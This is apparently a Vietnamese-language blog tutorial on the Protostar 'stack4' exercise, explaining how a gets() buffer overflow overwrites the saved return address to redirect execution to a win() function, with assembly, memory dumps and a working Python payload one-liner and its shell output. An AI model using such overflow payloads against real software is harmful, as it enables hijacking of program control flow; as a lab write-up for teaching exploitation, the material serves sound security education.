---
layout: post
title: stack4
---
Kỹ thuật trong bài trước giới thiệu cách tìm và gán địa chỉ hàm để gọi đến hàm đó.
Tuy nhiên, việc gọi hàm thành công là do trong source code đã có sẵn dòng lệnh với mục đích tương tự.
Trong bài này, chúng ta sẽ tìm hiểu cách thức gọi hàm hoàn toàn ngoài ý muốn của chương trình.
Hãy xem source code sau:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Có thể thấy bên trong hàm `main` chỉ gọi `gets` để lấy giá trị người dùng nhập vào và gán cho biến `buffer`.
Chương trình sẽ thoát ngay sau đó mà không có thêm lệnh nào khác.
Tuy nhiên, nếu nhìn vào asm code của chương trình như dưới đây, ta sẽ thấy có thêm 2 lệnh được chạy.
```asm
0x080483f4 <win+0>:     push   ebp
0x080483f5 <win+1>:     mov    ebp,esp
0x080483f7 <win+3>:     sub    esp,0x18
0x080483fa <win+6>:     mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
```
2 lệnh được nhắc đến là `leave` và `ret`, tương đương với `return` trong C.
Lưu ý rằng chạy một chương trình tương tự như việc gọi 1 hàm con.
Trước khi lệnh đầu tiên của hàm con được thực thi, CPU sẽ lưu lại địa chỉ của lệnh kế tiếp cần được thực hiện sau khi hàm con kết thúc.
Khi hàm con return về hàm đã gọi nó, địa chỉ này sẽ được `pop` vào `eip`, và lệnh tại đó được thực thi.
Ví dụ, hãy cùng xem stack ngay trước vào khi gọi hàm `gets` trong `main` của chương trình stack4.
Phân biệt theo màu: <span style="color:aqua">esp</span> và <span style="color:orangered">eip</span>.
<pre class="memory">
<span style="color:orangered">0x08048418</span> <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
...
0xbffff748:     0xb7fff8f8
0xbffff74c:     0xb7f0186e
<span style="color:aqua">0xbffff750</span>:     0xbffff760
0xbffff754:     0xb7ec6165
</pre>
Ngay sau khi lệnh `call` được thực thi.
<pre class="memory">
<span style="color:orangered">0x0804830c</span> <gets@plt+0>:        jmp    DWORD PTR ds:0x80495fc
...
0xbffff748:     0xb7fff8f8
<span style="color:aqua">0xbffff74c</span>:     0x0804841d
0xbffff750:     0xbffff760
0xbffff754:     0xb7ec6165
</pre>
Ở đây, lệnh cần được thực thi sau khi `gets` hoàn thành nằm ở địa chỉ `0x804841d`.
Do vậy lệnh này được `push` vào stack.

Khi áp dụng lý thuyết này vào trường hợp stack4 được gọi bởi hệ điều hành, ta biết được sẽ có 1 địa chỉ lệnh được lưu vào bộ nhớ để dùng sau khi stack4 kết thúc.
`ret` của stack4 sẽ pop giá trị địa chỉ này vào `eip` sau khi nó được thực thi.
Nếu biết vị trí lưu địa chỉ này, chúng ta có thể exploit chương trình bằng cách ghi đè địa chỉ khác lên nó và điều hướng cho chương trình thực thi lệnh lưu ở địa chỉ mới.
Các hacker sử dụng lý thuyết này để điều hướng và chạy đoạn mã độc của họ.

Callee và caller là thuật ngữ để chỉ một hàm (caller) gọi một hàm khác (callee).
Cần lưu ý thêm rằng ngoài địa của lệnh kế tiếp, `ebp` của caller cũng được lưu lại.
(nếu để ý đoạn code sẽ thấy lệnh `push ebp` là lệnh đầu tiên của main.)
Một vài calling convention quyết định bởi compiler, trong đó có ví dụ stack4 của bài viết này, sẽ lưu `eip`, tiếp theo là 4 byte `ebp` lên stack, và có thêm cả padding.
Callee sẽ có `ebp` chính là `esp` của caller.
Padding trong bài này có thể thấy qua lệnh `and esp,0xfffffff0`. Lệnh này sẽ biến thay đổi 4 bit nhỏ nhất trong giá trị `esp` về 0.
(kỹ thuật này còn được gọi là memory alignment, dùng để tối ưu và tăng tốc truy cập bộ nhớ.)
Như vậy padding sẽ có độ dài thông thường là 0, 4, 8, hoặc 12 byte.
Để ghi đè vào đúng địa chỉ mong muốn, ta sẽ cần quan tâm đến phần padding này.

Từ asm code của `main` (callee), ta thấy được `buffer` sẽ chiếm 64 byte bộ nhớ từ `esp + 0x10` đến `esp + 0x4f`.
Ngay sau `buffer`, bắt đầu từ `esp + 0x50` sẽ là phần bao gồm padding với độ dài không chắc chắn và theo sau với 4 byte `ebp` của caller trước khi chạm đến được địa chỉ `eip` của caller.
Như vậy, ta sẽ cần chuẩn bị giá trị tương đương khoảng 64 + 12 + 4 + 4 = 84 byte để làm tràn `buffer` và lưu địa chỉ mới cho `eip` của caller.
Sau đây là giá trị được dùng làm ví dụ, với địa chỉ của win là `0x080483f4`.
Phân biệt theo màu: <span style="color:aqua">buffer</span> và <span style="color:orangered">vùng padding, ebp, eip của caller</span>.

<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080495ec</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x080482e8</span>
0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080495ec</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x08048449</span>
0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048430</span>      <span style="color:aqua">0xbffff7a8</span>
0xbffff790:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804843b</span>      <span style="color:aqua">0xb7fd7ff4</span>
0xbffff7a0:     <span style="color:orangered">0x08048430</span>      <span style="color:orangered">0x00000000</span>      <span style="color:orangered">0xbffff828</span>      <span style="color:orangered">0xb7eadc76</span>
0xbffff7b0:     <span style="color:orangered">0x00000001</span>      0xbffff854      0xbffff85c      0xb7fe1848
</pre>
Sau khi gọi hàm `gets`:
```bash
python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + '\xf4\x83\x04\x08' * 5" > input.txt
stack4 < input.txt
```
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     <span style="color:aqua">0x41414141</span>      <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>
0xbffff770:     <span style="color:aqua">0x45454545</span>      <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>
0xbffff780:     <span style="color:aqua">0x31313131</span>      <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>
0xbffff790:     <span style="color:aqua">0x35353535</span>      <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>
0xbffff7a0:     <span style="color:orangered">0x080483f4</span>      <span style="color:orangered">0x080483f4</span>      <span style="color:orangered">0x080483f4</span>      <span style="color:orangered">0x080483f4</span>
0xbffff7b0:     <span style="color:orangered">0x080483f4</span>      0xbffff800      0xbffff85c      0xb7fe1848
</pre>

Lời giải này giả thiết chúng ta không biết về padding.
Trên thực tế, ta có thể dùng gdb để kiểm tra độ dài này.
Cụ thể, độ dài này sẽ nên là 8 byte thay vì 12 byte.
Dùng 12 byte sẽ khiến chương trình lưu thêm 1 lần địa chỉ của `win` vào phía sau, dẫn dến 2 lần thực thi hàm `win` này.
Bạn có thể xem kết quả chạy ở cuối bài viết.

## Ref
```bash
user@protostar:~$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + '\xf4\x83\x04\x08' * 5" > input.txt
user@protostar:~$ stack4 < input.txt
code flow successfully changed
code flow successfully changed
Segmentation fault
```

Lời giải phổ biến hơn với giả định padding thông thường dài 8 byte:
```bash
user@protostar:~$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + '\xf4\x83\x04\x08' * 4" > input.txt
user@protostar:~$ stack4 < input.txt
code flow successfully changed
Segmentation fault
```
